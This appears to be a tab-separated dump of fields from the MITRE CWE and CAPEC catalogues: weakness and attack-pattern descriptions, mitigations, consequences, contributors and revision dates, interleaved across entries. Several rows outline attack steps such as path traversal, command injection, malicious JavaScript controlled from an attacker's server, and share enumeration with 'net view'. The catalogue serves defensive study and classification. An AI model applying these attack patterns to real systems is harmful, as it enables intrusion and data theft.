25032	28	CWE Content Team
22326	35	MITRE
18790	26	Implementation
13412	102	ChildOf
17332	62	updated Description, Name
22273	28	CWE Content Team
23778	97	DNS Spoofing
16083	100	The MITRE Corporation
11410	77	Manual Static Analysis - Source Code
21879	91	Implementation
10258	63	Modify Application Data
24121	62	updated Potential_Mitigations
16228	70	Cross Site Identification - or - How your social network might expose you when you least expect it
11991	90	C
7838	50	End users must ensure that they provide sensitive information only to websites that they trust, over a secure connection with a valid certificate issued by a well-known certificate authority.
24603	88	Interpretation Conflict
17141	39	2010-02-16
18910	62	updated Common_Consequences
22648	79	Integrity
19642	39	2008-07-01
20766	23	The software uses a CAPTCHA challenge, but the challenge can be guessed or automatically recognized by a non-human actor.
19978	90	Language-Independent
10806	81	Non-Repudiation
5803	35	MITRE
9464	101	CAPEC Content Team
9071	95	The resource is modified/checked concurrently by multiple processes. By using one of the processes, the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host.
23000	39	2011-06-27
25196	43	Simple
20432	28	CWE Content Team
8269	31	1000
25036	91	Implementation
7217	42	Terminate the client session after each request.
7992	35	MITRE
17147	90	Language-Independent
18681	39	2019-06-20
9351	62	updated Relationships, Type
19787	62	updated Applicable_Platforms, Causal_Nature
20889	62	updated Description
13873	63	Read Application Data
15842	55	CAPEC Content Team
8682	35	MITRE
7381	47	Gain Privileges
23885	74	2
6266	26	Implementation
14784	35	MITRE
5853	28	CWE Content Team
21579	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
8454	39	2019-06-20
11574	31	1000
13560	39	2011-06-27
20251	62	updated Description, Type
9544	91	System Configuration
15073	39	2008-09-08
10537	28	CWE Content Team
9724	103	Primary
21144	100	The MITRE Corporation
6837	62	updated Related_Attack_Patterns, Relationships
17504	39	2010-06-21
8350	89	Meta
10832	28	CWE Content Team
22034	39	2009-05-27
20009	63	DoS: Crash, Exit, or Restart
13310	91	Implementation
14789	39	2010-02-16
19109	69	Draft
20682	91	Implementation
17268	91	Architecture and Design
7014	39	2011-06-01
7471	28	CWE Content Team
21976	39	2008-07-01
22385	101	CAPEC Content Team
10938	51	2014-06-23
23682	23	The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.
19581	56	ChildOf
14418	74	2
18832	28	CWE Content Team
6936	40	The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically "rings home" asynchronously using the session token
19763	90	Language-Independent
8434	35	MITRE
12137	63	Other
7545	39	2012-10-30
22765	25	Low
7743	62	updated Relationships, Taxonomy_Mappings
16797	69	Incomplete
17204	78	Very Low
6262	31	1003
7071	81	Availability
23467	62	updated Relationships
9545	39	2008-11-24
24572	40	An authoritative signer is using a weak method of random number generation or weak signing software that causes key leakage or permits key inference.
16554	35	MITRE
11660	23	The software assigns an owner to a resource, but the owner is outside of the intended control sphere.
17533	39	2009-03-10
6736	35	MITRE
14643	97	Bypassing Electronic Locks and Access Controls
21400	62	updated Description, Potential_Mitigations
6471	78	High
18980	39	2008-09-08
20065	28	CWE Content Team
25353	39	2009-07-27
16995	56	ChildOf
22205	39	2010-04-05
5976	56	ChildOf
23439	28	CWE Content Team
10400	47	Read Data
18913	101	CAPEC Content Team
9323	39	2009-12-28
24836	28	CWE Content Team
19938	31	1000
23484	28	CWE Content Team
21412	35	MITRE
24936	31	699
23810	39	2010-02-16
18015	103	Primary
23137	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Origin Analysis
8672	102	ChildOf
16883	63	Alter Execution Logic
23761	35	MITRE
13855	59	Updated Attack_Pattern, References
10216	69	Draft
19580	56	CanPrecede
18295	21	Anonymous Tool Vendor (under NDA)
9855	59	Updated Related_Weaknesses
20879	30	Robert C. Seacord
18907	39	2008-10-14
9856	76	2017-05-01
24476	55	CAPEC Content Team
10063	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
11440	59	Updated Description, Taxonomy_Mappings
8045	26	Implementation
15286	39	2011-06-27
5863	28	CWE Content Team
17526	39	2008-07-01
23613	101	CAPEC Content Team
9289	28	CWE Content Team
23944	79	Access Control
12923	35	MITRE
21314	39	2014-07-30
21633	39	2008-09-08
5940	42	Understand all the potential locations that are accessible to attackers. For example, some programmers assume that cookies and hidden form fields cannot be modified by an attacker, or they may not consider that environment variables can be modified before a privileged program is invoked.
20451	91	Implementation
22108	35	MITRE
15243	33	Anton Rager
14782	80	The attacker must possess knowledge of client code structure as well as ability to reverse-engineer or decompile it or probe it in other ways. This knowledge is specific to the technology and language used for the client distribution
18672	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
8899	39	2017-11-08
22708	62	updated Description, Maintenance_Notes, Relationships, Taxonomy_Mappings
23102	35	MITRE
11748	70	WASC Threat Classification 2.0
22989	39	2011-06-27
22153	100	The MITRE Corporation
9269	39	2017-11-08
13185	79	Availability
24314	100	The MITRE Corporation
24698	39	2010-12-13
17213	39	2011-06-27
18911	62	updated Common_Consequences, Observed_Examples, Relationships, Taxonomy_Mappings
12073	23	An adversary develops targeted malware that takes advantage of a known vulnerability in an organizational information technology environment. The malware crafted for these attacks is based specifically on information gathered about the technology environment. Successfully executing the malware enables an adversary to achieve a wide variety of negative technical impacts.
16898	51	2014-06-23
23624	39	2019-01-03
11124	59	Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Probing_Techniques, Resources_Required, Solutions_and_Mitigations
6259	62	updated Common_Consequences, Demonstrative_Examples, Description, Maintenance_Notes, Name, Observed_Examples, Relationships
16989	62	updated Time_of_Introduction
20033	35	MITRE
17788	55	CAPEC Content Team
9027	85	203
16586	35	MITRE
12467	35	MITRE
8709	92	Experiment
13306	62	updated Related_Attack_Patterns, Relationships
13600	46	Client-side authentication is extremely weak and may be breached easily. Any attacker may read the source code and reverse-engineer the authentication mechanism to access parts of the application which would otherwise be protected.
21657	90	Assembly
9989	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
21885	31	1000
6514	39	2011-06-01
16401	88	Improper Use of Validation Framework
23783	47	Unreliable Execution
18954	73	If some of the attributes of the <object> tag are received as parameters, the 'flashvars' attribute is injected into the <object> tag without the creator of the Web page ever intending to allow arguments to be passed into the Flash file.
22362	63	Gain Privileges or Assume Identity
21193	88	Improper Check or Handling of Exceptional Conditions
13702	28	Eric Dalci
22183	69	Draft
23966	78	Medium
10488	67	High
18221	59	Updated Related_Attack_Patterns
15592	31	1000
7107	91	Implementation
6058	79	Integrity
9154	39	2017-05-03
16467	62	updated Description, Other_Notes
10030	39	2008-08-15
17108	42	Where possible, use unique identifiers. If non-unique identifiers are detected, then do not operate any resource with a non-unique identifier and report the error appropriately.
23421	28	CWE Content Team
11191	62	updated Potential_Mitigations
8464	53	The MITRE Corporation
20893	55	CAPEC Content Team
6673	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling
18966	62	added/updated demonstrative examples
12407	39	2008-08-01
15280	35	MITRE
16434	62	updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
10069	97	Force Use of Corrupted Files
11594	27	Ability to detect instances where a target system is vulnerable to an oracle padding attack                Sufficient cryptography knowledge and tools needed to take advantage of the presence of the padding oracle to perform decryption / encryption of data without a key
7764	104	326
15065	69	Incomplete
15825	62	updated Related_Attack_Patterns
13888	39	2014-07-30
8076	62	updated Potential_Mitigations
19524	35	MITRE
18848	91	Implementation
10367	28	CWE Content Team
8924	62	updated Related_Attack_Patterns
7134	39	2008-07-01
23563	39	2017-05-03
25108	45	Variant
15653	78	Very High
7513	88	Function Call With Incorrect Number of Arguments
18334	62	updated Relationships
7468	35	MITRE
18403	39	2011-09-13
18723	39	2019-06-20
23609	42	Where available, configure the environment to use less verbose error messages. For example, in PHP, disable the display_errors setting during configuration, or at runtime using the error_reporting() function.
14465	26	Implementation
13064	62	updated Modes_of_Introduction, Observed_Examples, Relationships
23406	46	This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
6457	27	The adversary requires a network mapping/scanning tool, or must conduct socket programming on the command line. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.
8592	35	MITRE
7405	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....' (multiple dot) sequences that can resolve to a location that is outside of that directory.
22745	62	updated Name, Research_Gaps
7746	28	CWE Content Team
7475	97	Buffer Overflow via Parameter Expansion
9407	35	MITRE
15313	28	Eric Dalci
15196	40	User-manipulateable HTTP Request headers are processed by the web server
19787	28	CWE Content Team
5936	85	236
18857	28	CWE Content Team
20974	39	2011-06-01
21629	28	CWE Content Team
12875	39	2008-09-08
7023	104	253
24704	21	7 Pernicious Kingdoms
11830	91	Implementation
6645	21	PLOVER
7017	23	The software contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.
7222	39	2011-06-27
17229	35	MITRE
22029	62	updated Related_Attack_Patterns, Relationships
15576	28	CWE Content Team
15560	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12019	104	233
23201	85	397
21138	72	If the memory corrupted is data, rather than instructions, the system will continue to function with improper values.
7968	91	Implementation
20121	21	7 Pernicious Kingdoms
11952	42	Specify which data in the software should be regarded as sensitive. Consider which types of users should have access to which types of data.
17667	39	2008-07-01
20273	89	Detailed
11182	50	Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.
19182	27	None: No specialized resources are required to execute this type of attack.
18863	100	The MITRE Corporation
18327	62	updated Relationships
23431	39	2011-06-01
6943	104	20
10009	62	updated Relationships, Taxonomy_Mappings
14655	74	3
20840	96	2019-01-03
8565	62	updated Modes_of_Introduction, Other_Notes
11475	63	Read Files or Directories
25022	79	Integrity
14668	39	2011-06-01
23442	39	2012-05-11
25282	28	CWE Content Team
9884	100	The MITRE Corporation
7706	101	CAPEC Content Team
9377	28	CWE Content Team
6826	35	MITRE
8774	33	Sean Barnum
10607	63	DoS: Resource Consumption (CPU)
5601	79	Access Control
6087	39	2017-11-08
13356	51	2015-11-09
6048	28	CWE Content Team
16470	100	The MITRE Corporation
8954	28	CWE Content Team
23817	43	Simple
25212	51	2014-06-23
20862	39	2009-05-27
22265	81	Integrity
14657	39	2012-05-11
7373	28	CWE Content Team
18389	28	CWE Content Team
24204	57	Indirect
7956	55	CAPEC Content Team
10253	63	DoS: Crash, Exit, or Restart
25279	28	CWE Content Team
11982	28	CWE Content Team
15029	62	updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
6929	88	Improper Handling of Exceptional Conditions
6663	28	CWE Content Team
8033	39	2010-12-13
9853	35	MITRE
9043	26	Implementation
10404	39	2010-06-21
9297	43	Simple
13189	39	2011-06-01
23343	39	2008-07-01
8541	28	CWE Content Team
25319	103	Primary
21942	28	CWE Content Team
10352	35	MITRE
15885	39	2017-11-08
8165	28	CWE Content Team
25344	28	CWE Content Team
25290	46	This can result in compromise of the system for which the password is used. An attacker could gain access to this file and learn the stored password or worse yet, change the password to one of their choosing.
20629	73	Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.
18550	39	2014-06-23
7165	28	CWE Content Team
18356	23	An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or \) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.
8003	60	03
8592	39	2017-11-08
23504	35	MITRE
8493	89	Standard
22663	28	CWE Content Team
19301	28	CWE Content Team
16919	31	699
15183	101	CAPEC Content Team
11266	56	ChildOf
10805	104	486
18310	28	CWE Content Team
11806	56	ChildOf
12601	72	Often the actions performed by injected control code are unlogged.
11633	76	2018-07-31
21992	35	MITRE
8326	72	When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party.
11158	28	CWE Content Team
14004	103	Primary
24725	92	Exploit
12238	39	2008-07-01
5584	94	The adversary gains unauthorized access to information.
11720	28	CWE Content Team
23458	81	Integrity
15149	39	2010-02-16
23320	39	2008-07-01
21644	55	CAPEC Content Team
7178	35	MITRE
20052	24	MITRE
14362	63	Varies by Context
23338	39	2012-10-30
14810	28	CWE Content Team
9763	39	2009-05-27
19531	31	699
16034	35	MITRE
6281	40	This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame.
22468	28	CWE Content Team
24955	96	2018-07-02
11099	91	Implementation
8549	42	Do not use dangerous functions such as gets. Use safer, equivalent functions which check for boundary errors.
9442	103	Primary
24625	62	updated Demonstrative_Examples
18634	28	CWE Content Team
23504	28	CWE Content Team
15480	103	Primary
13525	39	2011-06-01
21585	28	CWE Content Team
18115	25	Low
10635	62	updated Relationships, Taxonomy_Mappings
18325	76	2017-05-01
13962	86	http://blogs.sans.org/appsecstreetfighter/2010/02/24/top-25-series-rank-9-os-command-injection/
19083	21	7 Pernicious Kingdoms
8650	63	Varies by Context
11495	91	Implementation
6284	40	User state is maintained at least in some way in user-controllable locations, such as cookies or URL parameters.
18953	28	CWE Content Team
17824	35	Cigital
23849	59	Updated Related_Attack_Patterns
16827	92	Exploit
5794	59	Updated @Abstraction, Related_Attack_Patterns
22767	62	updated Relationships
20939	89	Standard
16868	47	Bypass Protection Mechanism
11612	31	1000
21213	46	Performing a key exchange will preserve the integrity of the information sent between two entities, but this will not guarantee that the entities are who they claim they are. This may enable a set of "man-in-the-middle" attacks. Typically, this involves a victim client that contacts a malicious server that is impersonating a trusted server. If the client skips authentication or ignores an authentication failure, the malicious server may request authentication information from the user. The malicious server can then use this authentication information to log in to the trusted server using the victim's credentials, sniff traffic between the victim and trusted server, etc.
19434	28	CWE Content Team
18735	35	MITRE
19704	35	MITRE
19779	28	CWE Content Team
6238	39	2017-05-03
23829	103	Primary
15873	73	Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.
18160	81	Integrity
9081	31	1000
21445	39	2014-07-30
19681	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
17252	39	2012-05-11
14542	91	Implementation
8776	90	Language-Independent
22404	63	Unexpected State
20148	62	updated Other_Notes, Potential_Mitigations, Theoretical_Notes
16908	101	CAPEC Content Team
12426	31	699
7876	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.
13884	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
21381	62	updated Observed_Examples, References, Relationships
19554	56	ChildOf
11346	62	updated Potential_Mitigations
6258	73	The attacker injects context-appropriate malicious file path to cause the application to create, delete a targeted file.
19647	60	15
5786	81	Confidentiality
15039	28	CWE Content Team
7439	96	2018-07-02
9482	101	CAPEC Content Team
14672	97	Fuzzing and observing application log data/errors for application mapping
15098	63	DoS: Resource Consumption (Other)
21316	31	1000
16045	33	OWASP
18765	89	Detailed
15595	23	The accidental exposure of sensitive information through sent data refers to the transmission of data which are either sensitive in and of itself or useful in the further exploitation of the system through standard data channels.
21377	28	CWE Content Team
23772	36	http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/
20511	90	C++
10898	39	2010-12-13
22434	63	Quality Degradation
10749	81	Confidentiality
11565	62	updated Relationships
21111	31	1000
7210	74	1
13409	39	2012-10-30
23171	68	This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131).
16067	39	2009-10-29
14160	28	CWE Content Team
6359	35	MITRE
19613	100	The MITRE Corporation
13939	57	Primary
21133	69	Draft
20562	56	ChildOf
14840	73	Spider all available pages
25025	46	When a resource has not been properly initialized, the software may behave unexpectedly.  Typically this leads to a crash or invalid memory access, but the consequences vary depending on the type of resource and how it is used within the software.
17279	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
18982	47	Other
16262	62	added/updated demonstrative examples
19016	30	Stefano Di Paola
24964	35	MITRE
22991	76	2015-12-07
19782	56	ChildOf
12288	50	Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.
19903	35	MITRE
8219	88	Failure to Sanitize Paired Delimiters
13535	101	CAPEC Content Team
12866	91	Architecture and Design
5828	42	If the number to be used could have a negative value based on the specification (thus requiring a signed value), but the number should only be positive to preserve code correctness, then include a check to ensure that the value is positive.
6021	35	Cigital
21416	26	Implementation
8116	32	SecurityFocus
17917	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
9398	102	ChildOf
21241	39	2017-11-08
12233	40	The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.
5794	101	CAPEC Content Team
15118	39	2011-06-01
21368	39	2019-06-20
11889	57	Indirect
19256	76	2019-04-04
12986	53	The MITRE Corporation
12515	39	2013-02-21
10248	28	CWE Content Team
19586	63	Gain Privileges or Assume Identity
18427	79	Confidentiality
14834	62	updated Potential_Mitigations
19008	59	Updated Related_Weaknesses, Taxonomy_Mappings
21731	35	MITRE
19830	35	MITRE
15945	92	Exploit
17913	100	The MITRE Corporation
22007	60	12
15700	51	2019-04-04
20637	35	MITRE
17015	35	MITRE
20415	28	CWE Content Team
15861	28	CWE Content Team
20844	45	Variant
14698	62	updated Relationships
9910	39	2017-11-08
12029	56	ChildOf
13560	35	MITRE
5980	39	2014-07-30
15439	33	Object Management Group (OMG)
20746	35	MITRE
10927	35	MITRE
18558	79	Authorization
23803	101	CAPEC Content Team
11692	74	2
19675	92	Explore
15226	39	2008-07-01
11230	27	SYN pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.
7345	28	CWE Content Team
9738	25	Medium
20251	39	2013-07-17
21540	85	591
13841	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
19661	39	2008-07-01
15775	23	The program uses the chroot() system call to create a jail, but does not change the working directory afterward. This does not prevent access to files outside of the jail.
11640	63	Read Application Data
17284	62	updated Common_Consequences, Other_Notes
9492	31	1000
14224	35	MITRE
23184	23	The software does not exit or otherwise modify its operation when security-relevant errors occur during initialization, such as when a configuration file has a format error, which can cause the software to execute in a less secure fashion than intended by the administrator.
21030	21	7 Pernicious Kingdoms
11603	85	452
8832	39	2015-12-07
18994	35	MITRE
19304	63	Modify Memory
7137	39	2012-05-11
24323	62	updated Time_of_Introduction
6682	35	MITRE
14292	59	Updated References
20184	63	Modify Application Data
13062	39	2011-09-13
9203	104	111
10371	28	CWE Content Team
14531	62	Suggested OWASP Top Ten 2004 mapping
6856	35	MITRE
22524	26	Implementation
24541	101	CAPEC Content Team
17243	35	MITRE
18304	35	MITRE
9775	28	CWE Content Team
20211	62	updated Description, Relationships, Observed_Example, Weakness_Ordinalities
16961	91	Architecture and Design
7508	39	2018-03-27
16070	39	2008-11-24
11613	85	154
21353	28	Eric Dalci
15903	88	Struts: Unvalidated Action Form
9821	66	Web Portals: Gateway To Information, Or A Hole In Our Perimeter Defenses
19537	59	Updated Attack_Phases, Description Summary, Payload
9571	69	Incomplete
10678	39	2009-05-27
6799	39	2010-04-05
18843	62	updated Relationships, Taxonomy_Mappings
14327	80	Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line. The adversary, or his malware, can simply employ a set of commands that search for shared drives on the system (e.g., net view \\remote system or net share).
8341	62	updated Observed_Examples
7711	91	Architecture and Design
21369	39	2008-07-01
24651	33	Rishita Anubhai
9513	28	CWE Content Team
23544	35	Cigital
10639	62	updated Potential_Mitigations
20966	62	updated Relationships
12813	28	CWE Content Team
14207	77	Automated Static Analysis - Binary or Bytecode
12404	35	MITRE
11949	35	MITRE
11427	103	Primary
21668	35	MITRE
22957	72	The injected code could access restricted data / files.
22925	42	If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.                   Ensure that all failures in resource allocation place the system into a safe posture.
18447	28	CWE Content Team
13108	31	699
13601	102	CanPrecede
14120	35	MITRE
8382	62	updated Relationships
24317	35	MITRE
21164	55	CAPEC Content Team
22034	35	MITRE
11038	92	Explore
12802	39	2009-07-27
14863	91	Implementation
16329	39	2019-06-20
14492	63	Execute Unauthorized Code or Commands
24687	33	Jacob West
25190	101	CAPEC Content Team
7943	63	Reduce Reliability
24909	56	ChildOf
17486	28	CWE Content Team
6303	39	2009-03-10
12417	39	2011-06-01
17464	74	1
22453	88	Lack of Administrator Control over Security
22200	78	Medium
16414	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
13129	81	Availability
23529	62	updated Observed_Examples, Relationships
21956	35	MITRE
22277	26	Implementation
6364	35	Cigital
19949	81	Integrity
5898	62	updated Time_of_Introduction
7378	39	2008-07-01
15838	28	CWE Content Team
12204	35	MITRE
7162	23	This OS detection probe measures the average rate of initial sequence number increments during a period of time. Sequence numbers are incremented using a time-based algorithm and are susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely operation system matches.
11930	103	Primary
8300	42	A lower bound on the number of valid session identifiers that are available to be guessed is the number of users that are active on a site at any given moment. However, any users that abandon their sessions without logging out will increase this number. (This is one of many good reasons to have a short inactive session timeout.) With a 64 bit session identifier, assume 32 bits of entropy. For a large web site, assume that the attacker can try 1,000 guesses per second and that there are 10,000 valid session identifiers at any given moment. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is less than 4 minutes. Now assume a 128 bit session identifier that provides 64 bits of entropy. With a very large web site, an attacker might try 10,000 guesses per second with 100,000 valid session identifiers available to be guessed. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is greater than 292 years.
16511	62	updated Potential_Mitigations
6083	70	Building Secure Software
8102	73	The adversary can develop or obtain malware for to perform a variety of tasks such as sniffing network traffic or monitoring keystrokes.
7744	26	Implementation
15649	31	699
18229	81	Availability
14118	47	Read Data
8989	28	CWE Content Team
12404	39	2010-04-05
23950	74	3
11351	62	updated Other_Notes
22566	62	Clarified name and description; broadened the definition to include any security-critical operation, not just security decisions, to allow for relationships with injection weaknesses.
7358	62	updated Potential_Mitigations
15508	59	Updated Resources_Required
5927	30	Dag Arne Osvik
13752	63	Execute Unauthorized Code or Commands
14672	54	High
14936	69	Draft
15468	81	Integrity
9941	72	If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system.
12193	28	CWE Content Team
15231	66	Hacking Exposed Web Applications, Second Edition
10263	53	The MITRE Corporation
14889	72	When the consequence is arbitrary code execution, this can often be used to subvert any other security service.
9814	69	Draft
17143	79	Integrity
12575	28	CWE Content Team
23680	28	CWE Content Team
16290	39	2008-09-08
13306	28	CWE Content Team
23132	28	CWE Content Team
23191	95	[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user
23759	35	MITRE
7158	62	updated Potential_Mitigations, Time_of_Introduction
23461	56	ChildOf
24404	35	MITRE
23509	28	CWE Content Team
5907	35	MITRE
13498	80	To reverse engineering the libraries and inject malicious code into the libraries
9289	62	updated Demonstrative_Examples
7844	35	Cigital
7368	63	Modify Memory
24716	56	ChildOf
22373	28	CWE Content Team
20038	81	Non-Repudiation
15031	62	updated Relationships, Taxonomy_Mappings
20426	91	Implementation
24285	35	MITRE
14431	59	Updated Related_Attack_Patterns
17873	28	CWE Content Team
19956	63	DoS: Crash, Exit, or Restart
10592	28	CWE Content Team
25005	23	The J2EE application is configured to use an insufficient session ID length.
9964	56	ChildOf
19829	62	updated Description
20895	62	updated Potential_Mitigations
17885	85	499
21812	45	Variant
5875	56	ChildOf
12856	96	2009-03-03
19247	39	2009-10-29
23631	74	3
8964	42	Fully specify protocol layout unambiguously, providing a structured grammar (e.g., a compilable yacc grammar).
7866	59	Updated Related_Attack_Patterns
8273	62	updated Description, Name
21850	62	updated Background_Details, Common_Consequences, Relationships, Taxonomy_Mappings
6572	102	ChildOf
22067	39	2012-05-11
20273	85	535
17223	51	2014-06-23
8787	62	updated Time_of_Introduction
20152	35	MITRE
10674	62	updated Potential_Mitigations
14584	86	http://www.whitehatsec.com/home/assets/WP_bizlogic092407.pdf
20757	35	MITRE
23333	100	The MITRE Corporation
12146	35	MITRE
6988	56	ChildOf
10714	35	MITRE
18096	45	Variant
14497	95	The attacker creates a custom hostile service
22197	28	CWE Content Team
21166	35	Cigital
17885	97	Intent Intercept
12271	28	CWE Content Team
7718	39	2017-11-08
19214	100	The MITRE Corporation
20193	61	Draft
10931	53	The MITRE Corporation
15241	42	Run or compile your software with settings that generate warnings about uninitialized variables or data.
8689	39	2008-09-08
19900	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
5770	45	Base
18268	39	2008-09-08
20732	39	2019-01-03
17156	35	MITRE
11420	81	Integrity
20064	35	MITRE
22907	39	2019-06-20
7642	35	MITRE
24225	31	1000
15555	39	2011-03-29
17074	36	http://www.net-square.com/httprint_paper.html
11549	26	Implementation
21494	62	updated Taxonomy_Mappings
15388	62	updated Time_of_Introduction
8167	35	Cigital
9430	31	1000
9929	35	MITRE
18969	79	Availability
23964	39	2008-09-08
12681	21	CWE Content Team
18108	21	PLOVER
23948	80	The adversary requires strong inter-personal and communication skills.
5693	28	CWE Content Team
25308	79	Confidentiality
17365	35	MITRE
7559	35	MITRE
21676	35	MITRE
18626	28	CWE Content Team
11525	93	High
20702	62	updated Demonstrative_Examples, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
14342	62	updated Relationships, Type
10261	34	This issue is most frequently found in PHP applications that allow users to set configuration variables that are stored within executable PHP files. Technically, this could also be performed in some compiled code (e.g. by byte-patching an executable), although it is highly unlikely.
22839	39	2009-05-27
5725	55	CAPEC Content Team
14933	46	This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables.             It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.
23427	23	Facilities often used layered models for physical security such as traditional locks, Electronic-based card entry systems, coupled with physical alarms. Hardware security mechanisms range from the use of computer case and cable locks as well as RFID tags for tracking computer assets. This layered approach makes it difficult for random physical security breaches to go unnoticed, but is less effective at stopping deliberate and carefully planned break-ins. Avoiding detection begins with evading building security and surveillance and methods for bypassing the electronic or physical locks which secure entry points.
12409	85	296
10138	91	Implementation
16566	39	2009-01-12
12570	35	MITRE
16889	35	MITRE
18336	100	The MITRE Corporation
17653	62	updated Relationships
7086	28	CWE Content Team
21719	35	MITRE
10329	62	updated Description, Other_Notes
16712	35	MITRE
12723	62	Suggested OWASP Top Ten 2004 mapping
16934	99	Wikipedia
17465	76	2019-04-04
16136	28	CWE Content Team
22896	43	Simple
22307	56	ChildOf
22604	81	Integrity
18718	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
7781	42	In order for session replication to work, the values the application stores as attributes in the session must implement the Serializable interface.
17706	39	2018-03-27
7946	59	Updated Related_Weaknesses
25231	79	Access Control
9705	56	PeerOf
13736	85	386
16782	39	2008-09-08
25276	28	CWE Content Team
17260	23	An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.
17473	62	updated Common_Consequences, Relationships
16682	81	Availability
10309	33	NetSec
13180	62	updated Potential_Mitigations, Time_of_Introduction
8141	28	CWE Content Team
14551	63	DoS: Resource Consumption (Other)
7053	104	291
11856	39	2017-11-08
